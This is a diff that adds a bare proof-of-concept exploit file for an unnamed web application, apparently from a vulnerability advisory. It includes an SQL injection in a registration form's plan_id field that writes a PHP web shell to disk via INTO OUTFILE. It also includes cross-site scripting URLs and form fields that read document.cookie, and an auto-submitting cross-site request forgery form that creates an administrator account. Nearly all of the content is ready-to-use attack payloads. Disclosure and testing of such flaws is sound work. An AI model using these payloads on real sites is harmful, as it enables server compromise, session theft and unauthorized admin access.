@@ -1,0 +1,53 @@
+SQL injection:
+
+Input:
+
+<form action="http://[host]/register/" method="post">
+<input type="hidden" name="username" value='username' />
+<input type="hidden" name="fullname" value='fullname' />
+<input type="hidden" name="email" value='username@mail.com' />
+<input type="hidden" name="password" value='password' />
+<input type="hidden" name="password2" value='password' />
+<input type="hidden" name="security_code" value='[CAPTCHA]' />
+<input type="hidden" name="plan_id" value="0 UNION SELECT '<? system($cmd); ?>',1,1,1,1,1,1,1,1,1,1,1,1,1 INTO OUTFILE '../../../path/to/site/file.php'" />
+<input type="hidden" name="register" value="" />
+<input type="submit" id="btn">
+</form>
+
+Cross-site scripting:
+
+URIs:
+
+http://www.example.com/admin/accounts/edit/?id=1%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admin/configuration/?group=1%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/admin/manage/fields/edit/?id=1%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script% 3E
+http://www.example.com/admin/manage/blocks/edit/?id=1%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script% 3E
+
+Input:
+
+<form action="http://[host]/advsearch/" method="post">
+<input type="hidden" name="items[]" value='accounts' />
+<input type="hidden" name="f[accounts][fullname]" value='"><script>alert(document.cookie);</script>' />
+<input type="hidden" name="f[accounts][username]" value='"><script>alert(document.cookie);</script>' />
+<input type="hidden" name="q" value='' />
+<input type="submit" id="btn">
+</form>
+
+Cross-site request-forgery:
+
+Input:
+
+<form action="http://[host]/admin/accounts/add/" method="post">
+<input type="hidden" name="username" value='new_admin' />
+<input type="hidden" name="fullname" value='new_admin' />
+<input type="hidden" name="email" value='new_admin@mail.com' />
+<input type="hidden" name="usergroup" value='1' />
+<input type="hidden" name="status" value='active' />
+<input type="hidden" name="_password" value='_password' />
+<input type="hidden" name="_password2" value='_password' />
+<input type="hidden" name="save" value="Add" />
+<input type="submit" id="btn">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
